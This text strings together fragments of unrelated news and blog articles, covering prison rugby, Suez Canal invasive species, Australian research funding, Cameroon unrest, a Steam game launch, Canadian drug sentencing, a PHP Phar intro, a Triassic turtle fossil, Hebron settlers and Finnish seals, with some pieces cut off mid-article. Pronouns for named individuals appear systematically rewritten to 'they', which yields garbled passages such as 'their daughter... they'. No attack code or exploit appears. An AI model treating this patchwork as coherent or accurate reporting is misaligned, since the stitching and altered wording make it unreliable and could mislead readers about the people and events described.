Another game, inside the walls of another prison, had a different tone. The men complained about unfair calls from referees who favored their opponents. Some were petulant, like unruly children, they said. Their coaches took the opportunity to teach Los Spartanos tolerance and restraint.
“ ‘On the field, you are seeing inmates,' ” a coach told them, according to Ms. Heer. “ ‘Once you get out, you are going back to your old neighborhood and see the people who put you in here.' It reminded them they were always going to have these encounters.”
Of the rugby-playing inmates they photographed, Ms. Heer said five had since been released. All five are still free.
“The coaches are doing this not so the prisoners can get out,” they said. “They do it so they won't come back.”

INVASIVE species are a menace. In the Mediterranean, poisonous pufferfish frequently turn up in fishermen's nets. Summer swarms of stinging jellyfish close beaches as far west as Italy. And in the east, rabbitfish are eating most of the algae that native species rely on. Along with some 350 other non-indigenous species of marine life, all three migrants arrived from the Red Sea via the Suez Canal.
Marine experts are concerned that even more invasive creatures will turn up in the Mediterranean now that Egypt has started work on doubling the capacity of the Suez Canal with enlarged, deepened and new waterways. Egyptian officials have said the work will not add to the problems and are due to present an environmental-impact assessment to the European Commission. But Europe's administrators have been lackadaisical about seeking controls to stem the invasion, says Argyro Zenetos of the Greek government's Hellenic Centre for Marine Research in Athens. What, in any case, could Egypt do about it?
There are a number of technologies employed to deter aquatic migration. America's Mississippi River basin is infested with bighead and silver carp imported from China in the 1970s to stock ponds. Voracious eaters, they deprive native species of food. To keep them from getting into the Great Lakes through the Chicago Sanitary and Shipping Canal, stretches of it are electrified. The voltage trails off from a peak of about 2,000 volts in the centre of some electrified sections to zero about 22 metres either side. This gradient creates a zone of increasing discomfort sufficient to cause fish to turn around.
Electrified systems are used in other parts of the world and to keep fish out of the intake pipes at power plants. Smith-Root, an American firm, has electrified a spot in the Puntledge River near Courtenay, British Columbia, to discourage seals from decimating the juvenile salmon that congregate there (bigger animals feel the jolts more than small fish).
Another method is to create a curtain of bubbles. Produits Étang.ca, a Quebec manufacturer, pumps high-pressure air through submerged plastic pipes that have been drilled with microscopic holes. This throws up a dense, turbulent curtain of bubbles. Most fish are spooked and jellyfish avoid bubbles lest they fill their umbrella. A three-pipe bubble curtain for an enlarged Suez Canal would cost less than $1m, air compressors included, reckons Mario Paris, the firm's chief executive.
But bubbles do not stop all species. To make them scarier, Ovivo, another Quebec firm, illuminates bubbles with flashing bright lights and installs underwater speakers to produce loud noises. Although it seems a bit like an aquatic disco the constantly changing lighting and sound sequences are scientifically calculated to be as obnoxious as possible to various aquatic species. The combo works well enough to mostly keep Chinook salmon, a species not typically afraid of bubbles, out of a pumping station that draws water from the Sacramento–San Joaquin River Delta in Tracy, California.
The Panama Canal, which was built in the early 1900s, uses locks to lift vessels to Gatun Lake, an artificial expanse of water that was created to reduce the amount of digging. Being a freshwater lake it provides a barrier which prevents marine species from moving between the Pacific Ocean and the Caribbean Sea. If a competing canal is ever completed across Nicaragua, as the government intends, a natural lake will also be used as a freshwater barrier against migrating species.
The Suez Canal does not use locks as the sea levels at either end are similar. However, few organisms survived passage for about 80 years after it opened in 1869. This was due to a natural barrier, the so-called Bitter Lakes, a former salt pan. The lakes, though, no longer draw enough extra salinity from the ground to hinder the passage of sea creatures.
This leads some scientists to propose recreating a highly saline area. Noa Shenkar, a zoologist at Tel Aviv University, who organised an international workshop last year to discuss such ideas, says pumping brine from a desalination plant could create such a stretch. The typical salinity of the Red Sea is around 40 parts-per-thousand (ie, every kilogram of water contains 40 grams of salt). If some of the Suez Canal was raised to just 44 parts, marine organisms would be repelled or killed, they add. Chad Hewitt, a marine ecologist at the University of Waikato in New Zealand, suggests digging a section of the canal through another salt pan. If experts conclude Egypt should install some sort of barrier, then turning the clock back may be the answer.
A BRAIN drain has stripped Australia of one in four of its scientific leaders and 671 research positions as our best and brightest head overseas.
As Prime Minister Malcolm Turnbull talks up a vision for innovation and an ideas boom many of the people who could deliver it have left the country to get their research funded.
The Australian Society for Medical Research (ASMR) is warning “Australia is in danger of squandering its opportunity to capitalise on years of investment” in distinguished researchers.
And if researchers continue to leave there will not be enough with the experience to capitalise on new funds from the government's Medical Research Future Fund when it starts paying out money for research, it warns.
In its budget submission ASMR is calling on the government to provide $300 million for the Medical Research Endowment Account to stem the loss of senior researchers so they remain ready to take up positions when the Medical Research Future Fund is ready.
In the last five years the National Health and Medical Research Council (NHMRC) has slashed by 25 per cent the number of scientific leadership positions it funds under its Fellowship Scheme ASMR says.
In 2011 92 of these positions were awarded and in 2016 this fell to just 69 ASMR says.
There has also been a 16 per cent loss of human capital or 671 full time equivalent research positions from the major NHMRC Project Grants within the last three years.
The NHMRC currently funds less than one in seven project grant compared to a funding rate of over one in four a decade ago in 2007.
Australia's current investment into the NHMRC is 0.6% of the total health spend, while the US spends 4.5 per cent of its health budget on the equivalent National Institutes of Health.
“Should the current vibrant and highly qualified research community continue to suffer attrition due to lack of opportunity, its renewal and restoration would take decades and be enormously costly on many levels,” ASMR says in its budget submission.
Nearly a quarter of the health and medical research workforce told an ASMR survey they were uncertain as to whether or not they have employment in 2016.
Replacing 25 per cent of the PhD-qualified health and medical research sector would cost Australia $570 million in 2009 dollars, the ASMR says.
South Australian independent MP Senator Nick Xenophon says medical research funding should be made an election issue because it will take years to rectify the damage done by the brain drain to be undone.
“We are supposed to be the clever country but we make some dumb decisions on medical research,” they said.
Cancer researcher Dr Geoffrey Matthews says they were forced to leave Australia to get funding for their research into a new anti-cancer drug that targets multiple myeloma an incurable blood cancer.
They now work at Harvard University.
“In Australia, I worked under the mentorship of Professor Ricky Johnstone at the Peter MacCallum Cancer Centre, in Melbourne,” they say.
The paucity of grants and fellowships meant they were unable to secure NHMRC grant funding to continue their cancer research in Australia.
“I had always believed that contemporary Australian scientists did not need to head overseas to pursue a career due to the high calibre research being carried in our institutions. However, without the availability of sufficient funding to fund our research we are being driven overseas,” they say.
“In my case, and my wife's, an early career researcher in paediatric neuroscience, we chose the United States,” they say.
The ASMR represents more than 120,000 Australians involved in professional societies, medical colleges and corporate/disease related foundation members.
The so-called “resistance” to Trump continues to define Democratic Party politics across the nation, as California's four Democratic candidates for governor in 2018 competed to show off their anti-Trump credentials at a debate in San Francisco.
The debate was the second of the contest, after a debate Sunday in Anaheim in which the four candidates — Lieutenant Governor Gavin Newsom, former Los Angeles mayor Antonio Villraigosa, State Treasurer John Chiang, and former Superintendent of Public Instruction Delaine Eastin — differed on little except whether single-payer health care could be passed without funding.
On this occasion, according to the San Jose Mercury News, the candidates also differed on whether California should allow more charter schools. The issue has been dividing Democrats for several years, leading to bitter battles in state and local races for education offices. Only Villaraigosa seems to have taken a firm position on expanding charter schools. “Eastin supports a moratorium on charters, and Newsom — who has been endorsed by California Teachers Association — called for hiring more teachers, while … Chiang called for more accountability,” the Mercury News noted.
All four candidates also reportedly supported the California High-Speed Rail Authority, which Newsom once opposed until reversing themselves last year.
And Donald Trump, who was rarely mentioned in the first debate, was a focus of the second. Politico described the debate as a contest “to seize the anti-Trump mantle,” as candidates praised the state's efforts to pass legislation in defiance of the Trump administration, such as an extension of the cap-and-trade system and a “sanctuary state” law limiting cooperation with federal immigration enforcement.

Luaka Bop pay tribute to “an extraordinary artist, business person and visionary”.
William Onyeabor, the enigmatic Nigerian musician whose groundbreaking ‘70s synth-funk albums achieved global acclaim after being rediscovered and reissued in 2013, has died aged 70.
Luaka Bop, the label behind the retrospective compilation Who Is William Onyeabor?, announced their death on Facebook, saying they died peacefully in their sleep following a brief illness at their home in Enugu, Nigeria.
“It is with incredibly heavy hearts that we have to announce that the great Nigerian business leader and mythic music pioneer William Onyeabor has passed away at the age of 70,” wrote the label, describing them as “an extraordinary artist, business person and visionary”.
Born in 1946, Onyeabor composed and self-released nine albums of groundbreaking synth-based funk between 1977-1985, which they recorded, pressed and printed at their personal pressing plant, Wilfilms Limited, in southeast Nigeria.
In the 1980s abandoned music to focus on their business pursuits and remained an enigmatic figure. It took Luaka Bop five years to track them down and persuade them to license their music for a reissue, 2013's hugely successful Who is William Onyeabor?.
In 2014, a film documentary Fantastic Man delved into their story and the Atomic Bomb! Who is William Onyeabor? live shows saw special guests performing their music. Onyeabor refused most interview requests about their music, and was committed to their religion after becoming Born Again later in life.

Government forces in the central African nation killed at least eight people and wounded several more amid a crackdown on activists who wish to secede from the country.
One demonstrator was killed by soldiers when they attempted to raise the blue and white Ambazonia flag, which is the name the separatists want for their own state.
Donatus Njong Fonyuy, the mayor of Kumbo, told Reuters that five prisoners were also shot dead after a fire broke out at the local jail. The cause of the fire was unclear.

The anglophones, who make up some 20 percent of the nation's population, complain of being marginalized and not getting their fair share of the country's oil revenue.
Marginalization has long been a complaint, but the separatist movement began gathering steam late last year. Sunday's protests were timed to coincide with the anniversary of anglophone Cameroon's independence from Britain and reunification with the rest of the nation in 1961. The region could have gone its own way back then and become a sovereign state but opted to join their francophone compatriots.
One separatist group made a symbolic proclamation of independence on Sunday.
"We are no longer slaves of Cameroon," said Sisiku Ayuk, who describes themselves as the "president" of Ambazonia.
"Today we affirm the autonomy of our heritage and our territory," they said on social media on Sunday.
The recent protests have also become a rallying point against President Paul Biya, who has ruled over Cameroon for the past 35 years.

Businesses were closed in the region's two main cities, Buea and Bamenda, as army helicopters flew over the largely deserted urban centers.
Government warns journalists
The deployment included troops from the army's Rapid Intervention Brigade (BIR), a unit that more frequently fights Boko Haram - the Islamist militants occupying much of the north of the country.
Security forces were deployed on the outskirts of Buea and armed with water cannons to prevent a group of protesters from entering the city from a nearby town. The demonstrators chanted and waved the Ambazonia flag.
"I now know that the Biya regime has been raising an army all these years to fight its own people," said one resident, who insisted on anonymity out of fear of reprisal.
"We are simply fighting for our rights, but the military, which is supposed to protect lives and property, has turned into our greatest nightmare," they said.
"We are ready to die for the freedom of our land," Kenneth Agborbechem, one of the protesters, told dpa news agency.
Communications Minister Issa Tchiroma Bakary warned journalists not to give a voice to separatist groups.
"The media must not encourage those who advocate division, who want to destroy and destabilize our country," they told Reuters.

President Biya posted on their Facebook page that they condemn acts of violence "regardless of their source and their perpetrators."
"Let me make this very clear: it is not forbidden to voice any concerns in the Republic," they said. "However, nothing great can be achieved by using verbal excesses, street violence, and defying authority."
The European Union called on both sides to "respect the rule of law and avoid any act of violence."

We launched Toki Tori 2+ for Steam during the Summer Sale. Here's why we did that, how we fared and what we've learned.
The Steam Summer Sale is a big deal. Both for gamers who go crazy with all the discounts, but also for developers who see their sales skyrocket. It's such a big deal that we actively take the Summer and Christmas sale periods into account when making plans. We did sell more copies than our other three games when they launched on Steam, but it wasn't smooth sailing by any means and I hope this post will help others who are thinking of doing the same.
Before I continue, it's important to note that developers can get some inside information on the Summer Sale, but even in this case Valve Time kicks in and there are no guarantees. The original plan was to release Toki Tori 2+ on July 2nd. We added and tweaked quite a bit to make it worthy of the + monicker over the original Wii U release and felt comfortable that we would make that date. We did not know when the Summer sale would be when we announced that date. It could have been late July or even August, but once we learned it would be July 11th, we had a problem.
Early Adopters
The biggest thing during the Steam sales is always when your game is promoted as a daily deal. The clearly visible front page mention of your game is the single biggest factor in driving sales. A new game has a bigger chance of hitting this spot, so we knew we had to go for it. The thing is, Valve needs the daily deal to be a really good deal. They haven't said this in so many words, but my take is that it has to have the highest discount on your title yet in order to be considered. And we knew we had a shot of being featured on the opening day.
If we had launched on the 2nd, our launch discount would have to be lower than the one offered during the Summer Sale just nine days later. Basically this would mean our early adopters, the ones who stuck with us during our protracted development period, would be screwed over. We couldn't tell them to wait until the Summer Sale because we cannot disclose that information before it starts. So we had to pick between skipping the Summer Sale altogether and hope our initial sales spike on the 2nd would be enough, or we had to combine the two, which is what we decided on in the end.
The Plan
I strongly believe that the most important marketing you do is during development, to get into people's minds and make them want the game. The launch moment is mostly just letting already excited players know that they can press the buy button. This was going to be a challenge because our launch would definitely be less interesting than the news of the Summer Sale starting.
The Summer Sale starts a bit after the people at Valve wake up, which In Europe is during our early evening. We decided to focus on the moments before the summer sale, since we knew the rest of the development community wouldn't use that time, giving us a shot at getting the word out. So instead of ‘out now!', the news we brought was to be ‘out today!'. We asked reviewers to post their reviews the day before, so most people knew about the release beforehand.
We also planned on making the most out of the fact that we have existing players on Steam. We've got three other games on Steam, which have given us about 300,000 unique customers. We updated those games with Toki Tori 2+ banners and about 50,000 people are in various Game Groups that we can use to send direct messages to. To make sure we got the word out to the rest as well we decided to reward every single customer with one or more 10% off coupons, based on how many of our games they own on Steam, to be given out the moment the game went live.
Unfortunately almost nothing went according to our carefully laid out plan; only a few reviews were posted ahead of the game's launch, the summer sale date being the 11th was leaked, Steam's servers were down for most of the evening, the coupons were sent out at a snail's pace and there was nothing we could do about any of those.
Coupon hell in action.
Lessons Learned
- do not rely on outside technology when promoting your game
We went through what we refer to as Coupon Hell during the duration of the Summer Sale. For some still unknown reason, the loyalty coupons we had promised our existing customers were going out just a few hundred or so every hour. It was excruciating to watch the numbers of granted coupons shown on Steam's back-end almost match the amount of complaints we received. It took about two weeks to get mostly everyone their coupons, so in the end I believe it actually hurt the sales momentum as people started waiting on their coupons to arrive instead of buying it instantly.
- try to turn a potential problem into a marketing tool
Instead of seeing the fact that no-one knew when the Summer Sale would start as a problem, we could have turned into something good. We could have communicated that we'd launch the game at the start of the Summer Sale, linking the two events in people's minds and perhaps generating some interest ahead of time. I am not sure if Valve had agreed but:“Toki Tori 2+ to launch at opening day of Steam Summer Sale” is a heck of a lot more interesting than “Toki Tori 2+ delayed again, but trust us it's for a good reason”.
- communication in a time of discount madness is difficult
While we had sent out press releases and prepared our fans for what was to come, we did not communicate to the rest of the public that we had launched a new title during the Summer Sale. People scan the front page for deals and although our 34% off is a great deal for a just launched game, compared to 66% or even 80% off it doesn't look that desirable. Perhaps a banner ‘NEW RELEASE' would have helped, but it's still a tough sell I think.
- take the steam sales even more into account when planning
Even if we had launched on the 2nd of July, my guess is that many people would be saving up for the inevitable Steam Summer Sale to arrive. We could and quite frankly should have considered this more, perhaps launching a few weeks earlier to avoid the conflict. Having your first day sales spike and the Summer Sale spike separate is definitely the preferable situation in my opinion.
Colorado school bans 6-year-old transgender child from girls' bathroom The school alleges that Coy Mathis' presence in the girls' bathroom would be “psychologically damaging”
First-grader Coy Mathis has been banned from using the girls' bathroom at their Fountain, Colorado elementary school because they are transgender. Mathis had been using the girls' facilities until December 2012, when school administrators informed their parents that they would now have to use the boys' bathroom, a staff bathroom or the nurse's bathroom instead.
Mathis' passport and state-issued identification recognize them as female. According to their parents, their daughter has been expressing their gender identity as female since they were 18 months old, and living openly as a girl since age four.

But the school doesn't see them that way. W. Kelly Dude, an attorney for the Fountain-Fort Carson School District, said the school's decision "took into account not only Coy but other students in the building, their parents, and the future impact a boy with male genitals using a girls' bathroom would have as Coy grew older." Adding, "However, I'm certain you can appreciate that as Coy grows older and their male genitals develop along with the rest of their body, at least some parents and students are likely to become uncomfortable with their continued use of the girls' restroom."
The letter goes on to allege that Mathis' presence in the women's bathroom would be "psychologically damaging" later in life, and so the school chose to address the matter now.
The Mathis family has filed a complaint with the Colorado Civil Rights Division, the first claim to test the state's Anti-Discrimination Act, which includes protections based on gender identity. And, contrary to the school's belief that letting Mathis use the girls' bathroom would be "damaging" to other students, Michael Silverman, a lawyer for the family, says that the school has a unique opportunity to "turn this around and teach Coy's classmates a valuable lesson about friendship, respect and basic fairness."
Unlike other Colorado school districts, like Boulder Valley Schools, Mathis' school district does not have a policy in place to guarantee students can access a bathroom that corresponds to their gender identity.
Mathis' parents are homeschooling them until the case is resolved.

The final part of the fifth week of my drawing course with DrawPJ.com is now complete. When reading the details about my progress below please don't forget to click on the thumbnails by each section to see the cool drawing I created in more detail. My drawings were submitted to Cindy, my course instructor at DrawPJ.com, and their feedback (in italics) is also included below.
Unit One: Outline Drawing: Week Five (part II)
If you missed Part one of week 5's assignments, click here to see how I learned about Cross Hatching, Making Marks, Shading and Blending>
Exercise 2 Transferring the image of “The Old Hay Shed”
The purpose of this exercise was to learn how to transfer the image provided in the training notes onto quality drawing paper. The process was clearly explained as a series of step-by-step instructions in the course notes, which were complete with photographs. In summary, this was achieved by placing the original printout against a window, and tracing the outline of the image on the reverse of the sheet with a 2B pencil, then taping the sheet onto my paper, then finally going over the lines in pencil, which then left an outline of graphite on my paper. As you can see here, this outline which was left on my good quality drawing paper I could then use as a guide for my finished artwork.
Exercise 3: Completing the drawing of “The Old Hay Shed”
A full sized finished version of the drawing was also included in the course notes, which also explained in great detail how it was drawn. A key detailed all of the different types of marks used, the types of pencil or technique used to make the different marks, and darkness of tones. I used a separate piece of paper to try out all of the marks and techniques before I committed them to my actual drawing. It involved cross hatching, fine lines, use of cotton buds and the chisel point techniques learned in the preceding stages of this week course. It took me several hours to complete, and I'm rather proud of the result. What do you think? Please leave your feedback in the Reply section below 🙂
Feedback from Cindy
Wow Ian, this is absolutely fantastic! All of your pencil strokes are correct and the wonderful fine details and finishing touches here make it a standout piece! You can proudly frame this artwork as your first completed drawing. Well done! Cheers Cindy
Conclusion
I love the way this course is leading me step by step through all the things I need to know to become proficient at drawing. It's not just the theory, but it includes all of the simple things like how to prepare your pencils, and how to make particular marks that can be used to achieve specific results.
Coming up
I'm really looking forwards to the final part of this course where over two weeks I will be working my way through; using the grid method to transfer and image; creating a full sized finished drawing called “Frangipani Dreams” for which I will be graded. Please follow my Drawing Journey to see how I get on 🙂

Mandatory Minimum Sentencing in the News • June 17, 2011: States cut drug penalties as Canada toughens them After more than 20 years of the war on drugs, more than a dozen U.S. states are reducing penalties for many drug offences. The move away from mandatory minimum sentences without any chance of parole comes as states struggle to cover the costs of overcrowded prisons in the midst of tough economic times. Republicans and Democrats alike have also recognized weaknesses in their tough-on-crime, one-size-fits-all sentences. That's different from Canada, where the Conservative government has started toughening sentencing and imposing mandatory minimums for a number of crimes. • June 16, 2011: Call Off the Global Drug War By JIMMY CARTER
NY Times, Op-Ed Contributor Some of this increase has been caused by mandatory minimum sentencing and “three strikes you're out” laws. But about three-quarters of new admissions to state prisons are for nonviolent crimes. And the single greatest cause of prison population growth has been the war on drugs, with the number of people incarcerated for nonviolent drug offenses increasing more than twelvefold since 1980. Not only has this excessive punishment destroyed the lives of millions of young people and their families (disproportionately minorities), but it is wreaking havoc on state and local budgets. Former California Gov. Arnold Schwarzenegger pointed out that, in 1980, 10 percent of their state's budget went to higher education and 3 percent to prisons; in 2010, almost 11 percent went to prisons and only 7.5 percent to higher education. • June 13, 2011: Mandatory Minimum Terms for Cannabis Cultivation: How Crazy are the Harper Conservatives? There is a very real sense in which we - or at least the Tories - are operating without a shred of science on our side. Why are they doing this? The costs of jailing marijuana cultivators will soar into the billions of dollars within a few years - and it will be the provinces, not the federal government, that will have to pay for the construction and operation of these new provincial facilities. Why have the provinces been so silent? Are they looking to create prison industries in rural areas of their jurisdictions, shoring up longstanding unemployment, and potentially converting these voters to their cause? Do they not care about the costs and the consequences of putting thousands of non-violent offenders in jail? Could this money not be better spent on health care, or other more useful collective endeavours? • June 2, 2011: Canada's utterly failed drug policy [National Post editorial board]
"And yet, shockingly, a Conservative Canadian government, which purports to understand capitalism, proposes to re-introduce legislation that would impose mandatory minimum sentences for small-scale marijuana growers. This ridiculous policy seems designed to keep the trade in the hands of criminal lowlifes, who police can then pursue and hopefully catch and prosecute — if there's room in a courtroom and a judge is free some time in the next seven years, that is. • June 2, 2011: War on drugs ‘a failure,' international panel declares
Globe and Mail A high-powered panel of former heads of states and United Nations officials says it is time for governments to find new ways to deal with the world's drug problem
“The fact is that the war on drugs is a failure,” former Brazilian president Fernando Henrique Cardoso said Thursday at the unveiling of a report by the Global Commission on Drug Policy. Along with Mr. Cardoso, the commission includes former Colombian president Cesar Gaviria, former Mexican president Ernesto Zedillo, former U.S. secretary of state George Shultz, former UN secretary-general Kofi Annan and Canadian Louise Arbour, the former UN High Commissioner for Human Rights. • May 21, 2011: Crime and punishment: Inside the Tories' plan to overhaul the justice system
National Post Among the more controversial aspects of the bundle is mandatory minimum sentences. Minimum sentences are hardly new to the Criminal Code, and they are hardly partisan — the previous Liberal government imposed mandatory minimums on several child-exploitation offences. But the Conservative omnibus bill will dramatically expand them, limiting judicial discretion to levels unseen before.

"The legislation is more based on punishment than prevention, and that's dramatically new," said Errol Mendes, a professor of constitutional and international law at the University of Ottawa. "It's one of the most punishment-focused [agendas] in Canadian history." • May 14, 2011: Drug prohibition is dumb on crime
by Conrad Black and Dr. Evan Wood - National Post Here in Canada, this thinking is the basis for proposed federal mandatory minimum sentencing legislation. Unfortunately, like archaic cultures that clung to the belief that the Earth was flat, those who support mandatory minimum sentences for drug crimes are willfully ignorant of the near universal consensus that mandatory minimum sentences are both extremely costly and ineffective. • May 13, 2011: MP Blake Richards obediently champions Conservative "100 days" Omnibus crime bill
"Our goal: Safer street within the first 100 days"
Wild Rose Report: A column by MP Blake Richards
Canadians have waited long enough for these measures. We promised during the election that a majority Conservative government would bundle and pass into law our outstanding and delayed justice bills within Parliament's first 100 days and that is just what we intend to do.
This comprehensive legislation will include new measures that will: crack down on organized drug crime ; <snip>

This omnibus bill would include Bill S-10, misleadingly referred to in the article as a legislation to, "Crack down on organized drug crime."
• March 25, 2011: The Conservative Cabinet was found to be in contempt of Parliament FOR NOT REVEALING THE FULL COSTS OF THE CRIME BILLS and then lost a confidence motion. Many of the bills that were in progress died when the government fell. Bill S-10 was one of them. CONTEMPT OF PARLIAMENT
The Speaker of the House of Commons, Peter Milliken, ruled that the Conservative cabinet was in contempt of Parliament for withholding cost estimates over its prison-building program.
The Conservative government refused to release details of the prison-building costs to a parliamentary committee. This, says Speaker Milliken goes to the core role of MPs which is to hold the executive branch of government – Cabinet and the Prime Minister – to account for its actions. By being denied relevant financial figures Parliament cannot fulfil its role as an overseer of government spending.
Mr. Milliken writes that, “This is a serious matter that goes to the heart of the House's undoubted role in holding the government to account.”
A Vancouver Sun editorial commented: “For any government to be found in contempt of Parliament would be an affront to all Canadians. For one led by a prime minister who ran on a platform of openness and accountability, as Harper did, doubly so.”

PHP V5.3 is scheduled to release soon. This "What's new in PHP V5.3" series covers new and exciting features in this release. Part 1 looks at the changes made to the object-oriented programming and object handling in PHP V5.3, Part 2 looks at lambda functions and closures. And in Part 3, we look at namespaces, which is one of the most anticipated and the most debated feature in this release of PHP. Here in Part 4, we take a close look at Phar, which is an archive format that can be used within PHP. It can be used to not only archive files but also to deliver and run an entire PHP application from a single file. It can be used with PHP as an extension from the PECL repository, but will be an official extension of PHP in the upcoming V5.3 version.

Harris County officials have agreed to pay Terry Goodwin nearly half a million dollars for what they were forced to endure at the county lockup.
Months before Adrian Garcia resigned as Harris County Sheriff and officially entered the crowded Houston mayoral race, photos surfaced showing Terry Goodwin trapped inside a bug-infested cell at the Harris County jail. There were mounds of trash and feces clogging the toilet, sink and shower drain.
We later learned jailers had confined Goodwin to those foul conditions for “several weeks,” something Garcia knew nothing about until a whistleblower tipped off KTRK and the Texas Commission on Jail Standards. Garcia fumed, repeatedly telling reporters they were “damn mad” about what had happened on their watch. Ultimately, the Harris County District Attorney's Office filed charges of falsifying government records, a felony, against the second- and third-shift supervisors on Goodwin's unit (curiously enough, the first-shift sergeant on the unit was never charged), and heads rolled at the sheriff's office. Shortly before retiring, Garcia fired six jail supervisors (including the two already under criminal indictment), suspended 29 jail employees without pay and demoted one jail commander. The chief deputy overseeing jail operations resigned.
It's unclear how that kind of baggage might affect Garcia's run for mayor. But we do know the impact the Goodwin affair will have on Harris County taxpayers: $400,000.

The discovery of Pappochelys, a Triassic-era reptile with a set of emerging turtle-like features, is helping scientists fill in an important evolutionary gap.
Creationists have a tendency to declare any gap in the fossil record as evidence that Darwinian evolution is flawed. The dearth of transitional species, they argue, poses a huge problem for evolutionary biologists as they attempt to explain the shifts from, say, fish to amphibian, amphibian to reptile, reptile to mammal, and the emergence of such dramatic features as feathers, wings, shells, and mammalian milk.

Paleontologists and evolutionary biologists, on the other hand, are driven by the Darwinian paradigm as they painstakingly work to uncover these missing links. The latest development in this regard is the discovery of a 240-million-year-old reptile in Germany that lived during the Triassic Period. Named Pappochelys—meaning “grandfather turtle”—the creature was a blend of lizard- and turtle-like traits. The details of the discovery now appear at the science journal Nature.
“Pappochelys indeed forms a missing link for two reasons,” noted paleontologist and study lead author Rainer Schoch of Germany's State Museum of Natural History Stuttgart in a Reuters article. “It is far older than all so far known turtles. And its anatomy is more primitive in many features, showing the ancestral condition of various body regions.”

Image: (a) Restoration of the skeleton of Pappochelys in lateral view (as yet unknown elements in white; preserved bones in grey; trunk ribs and gastralia highlighted in black); (b) successive appearance of key features of the turtle body plan; (c) plastron of Odontochelys and reconstructed ventral bones of the shoulder girdle and gastralia set in Pappochelys (elements of the shoulder girdle and their homologues are indicated in a darker shade of grey).
Pappochelys, a stem-turtle, is 20-million-years older than the previous earliest-known turtle, Odontochelys from China. As the researchers write in their study:
The ~220-million-year-old stem-turtle Odontochelys from China has a partly formed shell and many turtle-like features in its postcranial skeleton. Unlike the 214-million-year-old Proganochelys from Germany and Thailand, it retains marginal teeth and lacks a carapace [the hard upper shell of a turtle]. Odontochelys is separated by a large temporal gap from the ~260-million-year-old Eunotosaurus from South Africa, which has been hypothesized as the earliest stem-turtle. Here we report a new reptile, Pappochelys, that is structurally and chronologically intermediate between Eunotosaurus and Odontochelys and dates from the Middle Triassic period (~240 million years ago).
Advertisement
Known from 18 fossil skeletons, Pappochelys had a long tail, a broad trunk, and a lizard-like skull. But it also featured belly armor composed of thick, rib-like bones that were starting to fuse to each other in many places. The paleontologists say it's an important stage in the evolution of the turtle shell.
“Transitional creatures are the most important contribution that paleontology can make to the study of evolution. They are often unexpected and show surprising features,” added Schoch. “They show how complicated structures like the skull or turtle shell formed step by step, and also give evidence on the sequence of evolutionary steps.”

Today, Atlanta rap weirdo-king Young Thug released Beautiful Thugger Girls, which he's called their “singing album,” which is kind of a meaningless distinction for someone who erases all boundaries between singing and rapping. But there are a few songs on the album that use acoustic guitars, and plenty of people are hearing a country-music influence, which is new. Also, the album includes one track, “Me Or Us,” which, as Pitchfork notes, samples the delicate acoustic guitar line of Bright Eyes' heartfelt 2005 love song “First Day Of My Life.” Post Malone co-produced the track with Charlie Handsome and Rex Kudo, and maybe we shouldn't be surprised that Post Malone is into Bright Eyes. Here, check it out:
Between Post Malone sampling “First Day Of My Life” for a Young Thug song and the time Mac Miller covered “Lua,” someone really needs to explore the connection between white rappers and Bright Eyes' I'm Wide Awake, It's Morning. There's something there!
Israeli police have evacuated Israeli settlers from buildings they had raided and temporarily took over in the occupied West Bank city of Hebron, as fearful residents say they have endured intimidation and attacks.
Officers on Friday morning evicted the settlers from two homes of Palestinians in Hebron, a flashpoint city during recent unrest.
Writing on Twitter, Israeli police spokesperson Micky Rosenfeld said police removed around 80 people who had "entered illegally", adding that there were "no injuries" and the homes were "closed off".
Israeli settlements make money on Palestinian expense: Human Rights Watch
When the settlers first occupied the buildings on Thursday, many of them attacked Palestinian residents and their homes, according to local media reports.
Reportedly protected by Israeli troops, the settlers broke the doors of several homes and threw rocks at Palestinian residents.
Local resident Shada Haddad, 25, said that clashes broke out between Palestinian youth and Israeli troops when the homeowners were blocked by the settlers from entering their buildings.
"The settlers occupied the homes in the Old City, and then the problems broke out between Palestinians and the army," they told Al Jazeera.

"The army was protecting the settlers like they always do," Haddad added, recalling that soldiers fired tear gas and the crowd of Palestinians who gathered.
The police's eviction of the settlers also sparked anger among many right-wing Israeli legislators who support the expansion of Jewish-only settlements throughout the West Bank, including East Jerusalem.
Bezalel Smotrich, a lawmaker from the ultra-nationalist Jewish Home party, was joined by Oren Hazan and Kara Ayoub, Knesset members from ruling rightist Likud party, in announcing a boycott of coalition votes until the settlers are allowed back into the homes.
In a press release, the Jewish Home party chastised the police as "irresponsible, bullheaded and inflammatory" for evicting the settlers, as reported by the Times of Israel news site.
A focal point in the ongoing unrest, the city is divided into three spheres of control - including full Palestinian Authority administration, joint administration between Israeli military forces and PA police, and full Israeli control.
Amid the 37,000 Palestinians that live there, thousands of soldiers are stationed in the "H2 area" of the city - under full Israeli military control - to protect the 600-strong Jewish settler population.
Dozens of Israeli military checkpoints severely restrict Palestinian movement into, out of and within Hebron.
Most Israeli settlers carry government-issued firearms and some have attacked Palestinians in Hebron and elsewhere in the past.

Speaking to Al Jazeera, Daoud, a local resident who did not provide their last name, said that "there were tear gas canisters everywhere" after the clashes subsided on Friday.
Daoud is a resident of the Hebron's Tel Rumeida neighbourhood, part of which was declared a closed military zone by Israeli forces in recent weeks.
Speaking of violent attacks by settlers and soldiers, Daoud said that local Palestinians "are scared to go out" due to a crackdown by Israeli forces.
"There has been a huge military presence all the time since October," they said, referring to the outset of the ongoing escalation in Israel and the occupied Palestinian territories.
"Where there used to be one soldier, there are now six."
Protests in other parts of the West Bank and the besieged Gaza Strip on Friday also saw at least 21 other Palestinians shot with live ammunition by Israeli soldiers.
Speaking to Al Jazeera by telephone on Friday night, an Israeli military spokesperson said only that Israeli forces used "riot dispersal means" in the West Bank and Gaza before using live ammunition.
The spokesperson said soldiers "fired at main instigators" during the protests and "hits were confirmed".
Between 2009 and 2014, Israeli settlements expanded by 23 percent in the West Bank, including East Jerusalem. Upwards of half a million Jewish Israelis already live in more than 150 Jewish-only settlements across the West Bank and East Jerusalem.
Back in Hebron, resident Daoud said that Palestinians are "living in fear" of a domino effect when settlers move to takeover more Palestinian homes. "They are terrified of settlers moving into their house next."

For a critically endangered species, every new birth counts.
Case in point, the Saimaa ringed seal (Pusa hispida saimensis). Only about 300 of these rare, landlocked pinnipeds still exist in the Finnish lake for which they are named. The seals are still breeding and conservation efforts have helped to boost the population slightly, but it hasn't been easy. According to a recent paper published in Marine Mammal Science, a combination of inbreeding and lack of ice has resulted in an estimated 70 percent infant mortality rate in recent years.
The seals, like many other Arctic species, rely on snow and ice for breeding, nursing their pups, and molting. That snow and ice, however, are in short supply due to the effects of climate change. As the authors wrote in their paper:
